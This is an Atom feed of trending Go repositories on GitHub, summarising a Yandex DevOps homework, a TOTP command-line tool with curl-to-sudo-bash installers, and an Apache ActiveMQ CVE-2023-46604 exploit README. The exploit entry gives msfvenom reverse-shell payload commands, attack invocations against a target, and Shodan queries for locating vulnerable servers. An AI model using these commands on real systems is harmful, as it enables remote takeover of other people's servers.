<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Go Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-11-09T01:35:07Z</updated>
  <subtitle>Daily Trending of Go in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>krya-kryak/y-y-devops-trainings-cloud-1</title>
    <updated>2023-11-09T01:35:07Z</updated>
    <id>tag:github.com,2023-11-09:/krya-kryak/y-y-devops-trainings-cloud-1</id>
    <link href="https://github.com/krya-kryak/y-y-devops-trainings-cloud-1" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Домашнее задание для DevOps-тренировок в Яндексе, лекция &#34;Облако. Кто виноват и что делать.&#34;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;DevOps-тренировки в Яндексе&lt;/h1&gt; &#xA;&lt;p&gt;Домашнее задание для DevOps-тренировок в Яндексе, лекция &#34;Облако. Кто виноват и что делать.&#34;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://yandex.ru/yaintern/training/devops-training&#34;&gt;https://yandex.ru/yaintern/training/devops-training&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Утром пришло письмо&lt;/h2&gt; &#xA;&lt;p&gt;В нашей компании праздник - вчера купили перспективный стартап &#34;CatGPT&#34; - приложение, автоматически улучшающее фотографии путём дорисовывания фотореалистичных котиков. У ребят уже есть рабочий прототип, нужно как можно скорее развернуть его и открыть пользователям.&lt;/p&gt; &#xA;&lt;p&gt;Сможешь всё сделать, как в лучших домах Лондона и Парижа? Если да, то это четыре динозаврика на ревью. Спасибо!&lt;/p&gt; &#xA;&lt;h2&gt;Технические моменты&lt;/h2&gt; &#xA;&lt;p&gt;Для решение этой домашнего задания понадобится доступ к Яндекс Облаку. У зарегистрированных участников DevOps-тренировок есть возможность запросить грант в случае необходимости, для этого нужно заполнить форму: &lt;a href=&#34;https://forms.yandex.ru/surveys/13482710.58cd805f71992dd086d6831888249bb90aa87cb3/&#34;&gt;https://forms.yandex.ru/surveys/13482710.58cd805f71992dd086d6831888249bb90aa87cb3/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;В течение примерно суток после заполнения формы на почту, привязанную к вашему аккаунту Яндекс.ID, придёт письмо от &lt;code&gt;Yandex Cloud &amp;lt;no-reply@cloud.yandex.ru&amp;gt;&lt;/code&gt; с темой &lt;code&gt;Вы приглашены в организацию&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!NOTE] Если вы забыли свой почтовый адрес, его можно посмотреть, например, на &lt;a href=&#34;https://id.yandex.ru/personal#contacts&#34;&gt;id.yandex.ru/personal&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Необходимо открыть письмо, перейти по ссылке &lt;code&gt;Принять приглашение&lt;/code&gt; и завершить регистрацию. В течение нескольких минут в консоли Облака появится облако &lt;code&gt;devops-training&lt;/code&gt; и персональный каталог, названный вашим логином.&lt;/p&gt; &#xA;&lt;p&gt;Удостоверьтесь, что доступ предоставлен, перейдя по &lt;a href=&#34;https://console.cloud.yandex.ru/cloud/b1g0vh6uspd0m39d5er6&#34;&gt;ссылке&lt;/a&gt;. Вы должны увидеть подобную картину:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/krya-kryak/y-y-devops-trainings-cloud-1/main/ui_cloud_folder.png&#34; alt=&#34;UI Screenshot&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Обязательно переключитесь в ваш персональный folder в облаке devops-training - грант покрывает потребление только в нём.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!WARNING] По завершении &lt;strong&gt;&lt;em&gt;обязательно&lt;/em&gt;&lt;/strong&gt; сделайте &lt;code&gt;terraform destroy&lt;/code&gt;. Если не удалить созданные ресурсы - грант на облако будет расходоваться попусту, и его может не хватить для следующих домашних работ.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Про приложение&lt;/h2&gt; &#xA;&lt;p&gt;По умолчанию приложение поднимает http-сервер на &lt;code&gt;:8080&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Readyness-проба для балансировщика висит на том же порту: &lt;code&gt;:8080/ping&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Приложение инструментировано метриками в формате Prometheus, которые по умолчанию можно получить на :9090/metrics. Например, есть разбивка по дневным и ночным котикам:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# HELP enhanced_photo_count by cat type&#xA;# TYPE enhanced_photo_count counter&#xA;enhanced_photo_count{cat_type=&#34;diurnal&#34;} 5&#xA;enhanced_photo_count{cat_type=&#34;nocturnal&#34;} 1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Информацию о кодах ответов приложение отдает в метрике http_response_count&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# HELP http_response_count by handler and code&#xA;# TYPE http_response_count counter&#xA;http_response_count{code=&#34;200&#34;,handler=&#34;/&#34;,method=&#34;post&#34;} 1&#xA;http_response_count{code=&#34;200&#34;,handler=&#34;/ping&#34;,method=&#34;get&#34;} 2&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Что нужно сделать.&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Прежде всего нужно залогиниться под своим аккаунтом и форкнуть себе репозиторий. В нём лежат исходники и terraform-инкструкция для разворачивания MVP&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Написать Dockerfile. Приложение написано на go и собирается стандартным тулчейном:&lt;/p&gt; &lt;pre&gt;&lt;code&gt;$ go mod download&#xA;$ CGO_ENABLED=0 go build -o path/to/resulting/binary&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;В качестве базового образа для сборки в docker рекомендуем использовать &lt;code&gt;golang:1.21&lt;/code&gt;; в качестве базового образа для рантайма - &lt;code&gt;gcr.io/distroless/static-debian12:latest-amd64&lt;/code&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://go.dev/doc/tutorial/compile-install&#34;&gt;https://go.dev/doc/tutorial/compile-install&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://hub.docker.com/_/golang&#34;&gt;https://hub.docker.com/_/golang&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/GoogleContainerTools/distroless&#34;&gt;https://github.com/GoogleContainerTools/distroless&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Опубликовать получившийся image в Yandex Container Registry (docker push)&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://cloud.yandex.ru/docs/container-registry/&#34;&gt;https://cloud.yandex.ru/docs/container-registry/&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Задача со звёздочкой: сделать автосборку с помощью Github CI&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://docs.github.com/en/actions/publishing-packages/publishing-docker-images&#34;&gt;https://docs.github.com/en/actions/publishing-packages/publishing-docker-images&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;С помощью Terraform развернуть стенд с приложением:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;сетевой балансировщик&lt;/li&gt; &#xA;   &lt;li&gt;две виртуальных машины под ним&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;На каждой виртуальной машине должен быть запущен:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;Контейнер с приложением. Тот самый контейнер, который собирался выше.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Unified-Agent. Unified-агент нужно будет настроить на получение метрик от приложения.&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://cloud.yandex.ru/docs/monitoring/concepts/data-collection/unified-agent/configuration#metrics_pull_input&#34;&gt;https://cloud.yandex.ru/docs/monitoring/concepts/data-collection/unified-agent/configuration#metrics_pull_input&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Важны момент: виртуальные машины обязательно использовать минимальных флейворов:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Платформа Intel Cascade lake&lt;/li&gt; &#xA; &lt;li&gt;2 vCPU&lt;/li&gt; &#xA; &lt;li&gt;Гарантированная доля vCPU 5%&lt;/li&gt; &#xA; &lt;li&gt;1 ГБ RAM&lt;/li&gt; &#xA; &lt;li&gt;прерываемая&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;При решении можно комбинировать различные инструменты - как от Облака, так и сторонние (вроде salt или ansible). Но для полного погружения рекомендуем попробовать развернуть Instance Group на базе Container Optimized Image: &lt;a href=&#34;https://cloud.yandex.ru/docs/cos/concepts/&#34;&gt;https://cloud.yandex.ru/docs/cos/concepts/&lt;/a&gt; &lt;a href=&#34;https://cloud.yandex.ru/marketplace/products/yc/container-optimized-image&#34;&gt;https://cloud.yandex.ru/marketplace/products/yc/container-optimized-image&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;После того, как стенд готов&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Построить в Yandex Monitoring графики, на которых для сервиса в целом можно будет посмотреть следующее:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Разбивку по типам нарисованных котивов (дневных и ночных)&lt;/li&gt; &#xA;   &lt;li&gt;Разбивку по кодам ответов, хендлерам и методам &lt;a href=&#34;https://cloud.yandex.ru/docs/monitoring/quickstart&#34;&gt;https://cloud.yandex.ru/docs/monitoring/quickstart&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Задача со звёздочкой: дополнительно инструментировать приложение и доработать дашборд для того, чтобы получить графики времён обработки запросов в разрезе handler и method&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Выключить одну из виртуальных машин. Убедиться, что сервис продолжает жить и обслуживать запросы.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!WARNING] &lt;strong&gt;&lt;em&gt;Обязательно&lt;/em&gt;&lt;/strong&gt; сделать &lt;code&gt;terraform destroy&lt;/code&gt;. Если не удалить созданные ресурсы - грант на облако будет расходоваться попусту, и его может не хватить для следующих домашних работ.&lt;/p&gt; &#xA;&lt;/blockquote&gt;</summary>
  </entry>
  <entry>
    <title>csyezheng/a2fa</title>
    <updated>2023-11-09T01:35:07Z</updated>
    <id>tag:github.com,2023-11-09:/csyezheng/a2fa</id>
    <link href="https://github.com/csyezheng/a2fa" rel="alternate"></link>
    <summary type="html">&lt;p&gt;a2fa is a command line tool for generating and validating one-time password. Its purpose is to get rid of phones and be able to authenticate easily.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;a2fa&lt;/h1&gt; &#xA;&lt;p&gt;a2fa &lt;em&gt;(&#34;annoying two-factor authentication&#34;)&lt;/em&gt; is a command line tool for generating and validating one-time password.&lt;/p&gt; &#xA;&lt;!-- TOC --&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/csyezheng/a2fa/main/#introduction&#34;&gt;Introduction&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/csyezheng/a2fa/main/#installation-instructions&#34;&gt;Installation instructions&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/csyezheng/a2fa/main/#linux&#34;&gt;Linux&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/csyezheng/a2fa/main/#macOS&#34;&gt;macOS&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/csyezheng/a2fa/main/#windows&#34;&gt;Windows&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/csyezheng/a2fa/main/#Manual-installation-and-more&#34;&gt;Manual installation and more&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/csyezheng/a2fa/main/#usage&#34;&gt;Usage&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/csyezheng/a2fa/main/#examples&#34;&gt;Examples&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/csyezheng/a2fa/main/#generate-code&#34;&gt;Generate code&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/csyezheng/a2fa/main/#add-account&#34;&gt;Add account&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/csyezheng/a2fa/main/#list-acccount&#34;&gt;List acccount&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/csyezheng/a2fa/main/#remove-accounts&#34;&gt;Remove accounts&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/csyezheng/a2fa/main/#update-acccount&#34;&gt;Update acccount&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/csyezheng/a2fa/main/#reporting-issues&#34;&gt;Reporting issues&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/csyezheng/a2fa/main/#contributing&#34;&gt;Contributing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/csyezheng/a2fa/main/#license&#34;&gt;License&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;!-- /TOC --&gt; &#xA;&lt;h2&gt;Introduction&lt;/h2&gt; &#xA;&lt;p&gt;a2fa means annoying two-factor authentication. Its purpose is to get rid of phones and be able to authenticate easily. It keeps synced with Google Authenticator, Microsoft Authenticator.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;An easy-to-use substitute for 2FA apps like TOTP Google authenticator.&lt;/li&gt; &#xA; &lt;li&gt;Supports the OATH algorithms, such as TOTP and HOTP.&lt;/li&gt; &#xA; &lt;li&gt;No need for network connection.&lt;/li&gt; &#xA; &lt;li&gt;No need for phone.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Installation instructions&lt;/h2&gt; &#xA;&lt;h3&gt;Linux&lt;/h3&gt; &#xA;&lt;p&gt;One-liner bash script to install a2fa&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo -v ; curl https://raw.githubusercontent.com/csyezheng/a2fa/main/scripts/install.sh | sudo bash&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;macOS&lt;/h3&gt; &#xA;&lt;p&gt;One-liner bash script to install a2fa&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo -v ; curl https://raw.githubusercontent.com/csyezheng/a2fa/main/scripts/install.sh | sudo bash&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Windows&lt;/h3&gt; &#xA;&lt;p&gt;One-liner PowerShell script to install a2fa&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Invoke-Expression &#34;&amp;amp; { $(Invoke-RestMethod &#39;https://raw.githubusercontent.com/csyezheng/a2fa/main/scripts/install.ps1&#39;) }&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Manual installation and more&lt;/h3&gt; &#xA;&lt;p&gt;Please see the &lt;a href=&#34;https://raw.githubusercontent.com/csyezheng/a2fa/main/docs/installation.md&#34;&gt;installation &lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;a2fa [command] [flags] [args]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;Available Commands:&#xA;  add         Add account and its secret key&#xA;  completion  Generate the autocompletion script for the specified shell&#xA;  generate    Generate one-time password from secret key&#xA;  help        Help about any command&#xA;  list        List all added accounts and password code&#xA;  remove      Remove account and its secret key&#xA;  update      Add account and its secret key&#xA;  version     show version&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;a2fa generate [flags] &amp;lt;secret key&amp;gt;&#xA;a2fa add [flags] &amp;lt;account name&amp;gt; &amp;lt;secret key&amp;gt;&#xA;a2fa remove [flags] &amp;lt;account name&amp;gt; &amp;lt;account name&amp;gt;...&#xA;a2fa update [flags] &amp;lt;account name&amp;gt; &amp;lt;secret key&amp;gt;&#xA;a2fa list [flags] [account name] [account name]...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Commonly used flags&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Flags:&#xA;  -b, --base32         use base32 encoding of KEY instead of hex (default true)&#xA;  -c, --counter int    used for HOTP, A counter C, which counts the number of iterations&#xA;  -e, --epoch int      used for TOTP, epoch (T0) which is the Unix time from which to start counting time steps&#xA;  -H, --hash string    A cryptographic hash method H (default &#34;SHA1&#34;)&#xA;  -h, --help           help for add&#xA;      --hotp           use event-based HOTP mode&#xA;  -i, --interval int   used for TOTP, an interval (Tx) which will be used to calculate the value of the counter CT (default 30)&#xA;  -l, --length int     A HOTP value length d (default 6)&#xA;      --totp           use use time-variant TOTP mode (default true)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Examples&lt;/h2&gt; &#xA;&lt;h3&gt;Generate code&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;a2fa generate [flags] &amp;lt;secret key&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Examples&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;a2fa generate ADOO3MCCCVO5AVD6&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output: Code: 488821&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Show flags and usage&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;a2fa generate -h&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Add account&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;a2fa add [flags] &amp;lt;account name&amp;gt; &amp;lt;secret key&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Examples&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;a2fa add GitHub ADOO3MCCCVO5AVD6&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output: account added successfully&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Show flags and usage&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;a2fa add -h&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;List acccount&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;a2fa list [flags] [account name] [account name]...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Examples&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;a2fa list&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;0. GitHUb 414033&#xA;1. Google 337590&#xA;2. Microoft 54936&#xA;3. Apple 70362&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Remove accounts&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;a2fa remove [flags] &amp;lt;account name&amp;gt; &amp;lt;account name&amp;gt;...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Examples&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;a2fa remove GitHub&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output: accounts deleted successfully&lt;/p&gt; &#xA;&lt;h3&gt;Update acccount&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;a2fa update [flags] &amp;lt;account name&amp;gt; &amp;lt;secret key&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Examples&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;a2fa update GitHub 5BRSSSBJUWBQBOXE&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output: account updated successfully&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Show flags and usage&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;a2fa update -h&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Reporting issues&lt;/h2&gt; &#xA;&lt;p&gt;If you encounter any problems, you can open an issue in our bug tracker, please fill the issue template with &lt;em&gt;as much information as possible&lt;/em&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;Refer to &lt;a href=&#34;https://raw.githubusercontent.com/csyezheng/a2fa/main/CONTRIBUTING.md&#34;&gt;CONTRIBUTING.md&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;Apache License 2.0, see &lt;a href=&#34;https://raw.githubusercontent.com/csyezheng/a2fa/main/LICENSE&#34;&gt;LICENSE&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ</title>
    <updated>2023-11-09T01:35:07Z</updated>
    <id>tag:github.com,2023-11-09:/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ</id>
    <link href="https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Achieving a Reverse Shell Exploit for Apache ActiveMQ (CVE_2023-46604)&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ&lt;/h1&gt; &#xA;&lt;p&gt;This exploit builds upon the foundational work available at &lt;a href=&#34;https://github.com/X1cT34m&#34;&gt;https://github.com/X1cT34m&lt;/a&gt; (&lt;a href=&#34;https://github.com/X1r0z/ActiveMQ-RCE&#34;&gt;https://github.com/X1r0z/ActiveMQ-RCE&lt;/a&gt;). We have further developed the technique to achieve a reverse shell utilizing the Metasploit Framework (&lt;a href=&#34;https://github.com/rapid7/metasploit-framework&#34;&gt;https://github.com/rapid7/metasploit-framework&lt;/a&gt;).&lt;/p&gt; &#xA;&lt;h1&gt;Usage:&lt;/h1&gt; &#xA;&lt;p&gt;&lt;b&gt;Important: Manually change the IP Address (0.0.0.0 on line 11) in the XML files with the IP Address where the payload will be generated. If u follow the below commands it will be your Listner IP Addess. Also {IP_Of_Hosted_XML_File} will be your Listner IP Address.&lt;/b&gt;&lt;/p&gt; &#xA;&lt;p&gt;For Linux/Unix Targets&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell&#xA;cd CVE-2023-46604-RCE-Reverse-Shell&#xA;msfvenom -p linux/x64/shell_reverse_tcp LHOST={Your_Listener_IP/Host} LPORT={Your_Listener_Port} -f elf -o test.elf&#xA;python3 -m http.server 8001&#xA;./ActiveMQ-RCE -i {Target_IP} -u http://{IP_Of_Hosted_XML_File}:8001/poc-linux.xml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For Windows Targets&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell&#xA;cd CVE-2023-46604-RCE-Reverse-Shell&#xA;msfvenom -p windows/x64/shell_reverse_tcp LHOST={Your_Listener_IP/Host} LPORT={Your_Listener_Port} -f eXE -o test.exe&#xA;python3 -m http.server 8001&#xA;./ActiveMQ-RCE -i {Target_IP} -u http://{IP_Of_Hosted_XML_File}:8001/poc-windows.xml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ/assets/66937297/db1b82e4-55ef-4f23-9df7-8a0cf99c01c4&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Shodan Dork:&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;product:&#34;ActiveMQ OpenWire Transport&#34;&lt;/li&gt; &#xA; &lt;li&gt;&lt;img src=&#34;https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ/assets/66937297/6d560881-7855-474b-8c8b-3fb5a3f09a94&#34; alt=&#34;image&#34;&gt;&lt;/li&gt; &#xA; &lt;li&gt;product:&#34;ActiveMQ OpenWire Transport&#34; port:61616&lt;/li&gt; &#xA; &lt;li&gt;&lt;img src=&#34;https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ/assets/66937297/1e073ec0-690e-40b1-bcc0-cb9390ca6b7c&#34; alt=&#34;image&#34;&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Original Work:&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/X1r0z/ActiveMQ-RCE&#34;&gt;https://github.com/X1r0z/ActiveMQ-RCE&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;For More Reading:&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.rapid7.com/blog/post/2023/11/01/etr-suspected-exploitation-of-apache-activemq-cve-2023-46604/&#34;&gt;https://www.rapid7.com/blog/post/2023/11/01/etr-suspected-exploitation-of-apache-activemq-cve-2023-46604/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://exp10it.cn/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/&#34;&gt;https://exp10it.cn/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://attackerkb.com/topics/IHsgZDE3tS/cve-2023-46604/rapid7-analysis&#34;&gt;https://attackerkb.com/topics/IHsgZDE3tS/cve-2023-46604/rapid7-analysis&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;A special thanks to &lt;a href=&#34;https://github.com/Anon4mous&#34;&gt;https://github.com/Anon4mous&lt;/a&gt; for actively supporting me.&lt;/p&gt;</summary>
  </entry>
</feed>